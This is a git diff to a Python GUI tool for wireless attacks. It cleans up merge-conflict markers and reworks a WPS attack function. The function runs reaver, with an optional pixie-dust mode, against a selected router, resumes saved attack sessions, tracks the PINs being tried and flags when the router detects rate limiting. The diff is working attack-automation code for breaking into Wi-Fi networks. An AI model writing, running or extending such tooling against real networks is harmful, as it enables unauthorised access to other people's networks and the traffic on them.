@@ -112,7 +112,6 @@ def try_handshake(root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_r
 
     return 0
 
-<<<<<<< HEAD
 # wps attack (includes pixie dust)
 def wps_attack(root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_right_click, pixie = False):
 
@@ -148,19 +147,48 @@ def wps_attack(root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_righ
         pix_arg = ''
         if pixie:
             pix_arg = '-K'
-        reaver = subprocess.Popen(('reaver -i'+ monitor_interface + ' --bssid ' + mac + \
-                                    ' -c ' + str(channel) + ' ' + pix_arg).split(" "), \
-                                    stdout=out_file, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1, cwd=cwd)
 
+        # check for old sessions - locations may depend on OS
+        old_session = ''
+        m = "".join(mac.split(":"))
+        if os.path.exists('/usr/local/etc/reaver/' + m + '.wpc'):
+            old_session = '-s /usr/local/etc/reaver/' + m + '.wpc'
+        elif os.path.exists('/var/lib/reaver/' + m + '.wpc'):
+            old_session = '-s /var/lib/reaver/' + m + '.wpc'
+
+        reaver = subprocess.Popen(('reaver -i '+ monitor_interface + ' --bssid ' + mac + \
+                                    ' -c ' + str(channel) + ' -vv ' + old_session + ' ' + pix_arg).split(" "), \
+                                    stdout=out_file, stderr=subprocess.STDOUT, stdin = subprocess.PIPE, \
+                                        universal_newlines=True, bufsize=1, cwd=cwd)
     done = False
     while not done:
         root.update()
         if os.path.exists(cwd+"/" + str(wifi_name) + "_reaver_output"):
             with open(str(wifi_name) + "_reaver_output", "r") as f: 
-                for line in f.readlines():
-                    print(line)
 
-                    if globs.stop_attack: # clicked stopped attack button
+                # Handle reaver cases/errors
+                for line in f.readlines():
+
+                    # Pin being tried
+                    if 'Trying pin' in line:
+                        pin = line.split("\"")[-2]
+                        tools.addToolInfo(T, "Trying now pin " + str(pin))
+
+                    # Router probably detected the attack
+                    elif "WARNING: Detected AP rate limiting" in line:
+                        tools.addToolInfo(T, line.strip() + "\nRouter may have detected pin attempts.\n")
+                        tools.addToolInfo(T, "Stop the attack manually if no new pins get tried in a while...\n")
+
+                    # This should not be the case
+                    elif "Restore previous session" in line:
+                        globs.stop_attack = False
+                        reaver.terminate()
+                        tools.addToolInfo(T, "Something went wrong, WPS attack cannot be executed on this machine.\n\n")
+                        done = True 
+                        break
+                    
+                    # clicked stopped attack button
+                    if globs.stop_attack: 
                         globs.stop_attack = False
                         reaver.terminate()
                         tools.addToolInfo(T, "Stopped WPS attack operation.\n\n")
@@ -172,7 +200,7 @@ def wps_attack(root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_righ
     tools.addToolInfo(T, "Monitor mode disabled for " + str(interface) + "\n\n")
 
     return 0
-=======
+
 
 def crack_wpa(root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_right_click):
     """
@@ -234,4 +262,3 @@ def crack_wpa(root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_right
     globs.stop_attack = False
 
     return 0
->>>>>>> f7b7144318f90835fd8a063f29267c0ebf4a45ca
